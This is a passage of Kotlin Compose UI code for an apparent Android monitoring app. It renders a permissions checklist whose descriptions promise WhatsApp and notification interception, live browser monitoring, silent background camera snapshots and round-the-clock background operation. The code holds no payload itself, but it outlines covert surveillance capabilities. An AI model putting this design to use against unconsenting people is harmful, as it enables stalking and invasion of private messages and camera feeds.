    onOpenExactAlarm: () -> Unit,
    modifier: Modifier = Modifier
) {
    val items = listOf(
        PermissionSettingItem(
            title = "Notification Access",
            description = "WhatsApp, Chats & Notification Interception",
            isGranted = hasNotificationListener,
            onClick = onOpenNotificationListener
        ),
        PermissionSettingItem(
            title = "Accessibility Service",
            description = "App activity & live browser monitoring",
            isGranted = hasAccessibility,
            onClick = onOpenAccessibility
        ),
        PermissionSettingItem(
            title = "Display Over Other Apps",
            description = "Background camera & silent snapshots",
            isGranted = hasOverlay,
            onClick = onOpenOverlay
        ),
        PermissionSettingItem(
            title = "Usage Access",
            description = "Track daily screen time & app limits",
            isGranted = hasUsageAccess,
            onClick = onOpenUsageAccess
        ),
        PermissionSettingItem(
            title = "Unrestricted Battery",
            description = "Prevent phone from killing service in sleep",
            isGranted = isBatteryOptimizationIgnored,
            onClick = onOpenBatteryOptimization
        ),
        PermissionSettingItem(
            title = "Exact Alarms",
            description = "Accurate schedules & background monitoring",
            isGranted = hasExactAlarm,
            onClick = onOpenExactAlarm
        )
    )

    val grantedCount = items.count { it.isGranted }
    val totalCount = items.size
    val isAllGranted = grantedCount == totalCount

    Card(
        modifier = modifier.fillMaxWidth(),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)
        ),
        border = androidx.compose.foundation.BorderStroke(
            1.dp,
            if (isAllGranted) MaterialTheme.colorScheme.primary.copy(alpha = 0.35f)
            else MaterialTheme.colorScheme.error.copy(alpha = 0.35f)
        )
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = if (isAllGranted) Icons.Default.CheckCircle else Icons.Default.Security,
                        contentDescription = null,
                        tint = if (isAllGranted) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.error,
                        modifier = Modifier.size(24.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "System Permissions",
                        style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold),
                        color = MaterialTheme.colorScheme.onSurface
                    )
                }

                Surface(
                    shape = RoundedCornerShape(8.dp),
                    color = if (isAllGranted) Color(0xFFE8F5E9) else Color(0xFFFFEBEE)
                ) {
                    Text(
                        text = if (isAllGranted) "All Active ($grantedCount/$totalCount)" else "$grantedCount/$totalCount Active",
                        style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold),
                        color = if (isAllGranted) Color(0xFF2E7D32) else Color(0xFFC62828),
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                    )
                }
            }

            Spacer(modifier = Modifier.height(4.dp))
            Text(
                text = "These Android settings allow 24/7 background monitoring. Tap any setting to turn ON or change.",
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )

            Spacer(modifier = Modifier.height(14.dp))

            items.forEachIndexed { index, item ->
                if (index > 0) {
                    HorizontalDivider(
                        modifier = Modifier.padding(vertical = 8.dp),
                        color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.4f)
                    )
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f).padding(end = 12.dp)) {
                        Text(
                            text = item.title,
                            style = MaterialTheme.typography.bodyMedium.copy(fontWeight = FontWeight.SemiBold),
                            color = MaterialTheme.colorScheme.onSurface
                        )
                        Text(
                            text = item.description,
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }

                    if (item.isGranted) {
                        Surface(
                            shape = RoundedCornerShape(12.dp),
                            color = Color(0xFFE8F5E9),
                            modifier = Modifier.clickable { item.onClick() }
                        ) {
                            Row(
                                modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Check,
                                    contentDescription = null,
                                    tint = Color(0xFF2E7D32),
                                    modifier = Modifier.size(16.dp)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = "ON",
                                    style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold),
                                    color = Color(0xFF2E7D32)
                                )
                            }
                        }
                    } else {
                        Button(
                            onClick = item.onClick,
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = MaterialTheme.colorScheme.error
                            ),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                        ) {
                            Text(
                                text = "TURN ON",
                                style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold),
                                color = MaterialTheme.colorScheme.onError
                            )
                        }
                    }
                }
            }
        }
    }
}

private data class PermissionSettingItem(
    val title: String,
    val description: String,
    val isGranted: Boolean,
    val onClick: () -> Unit
)
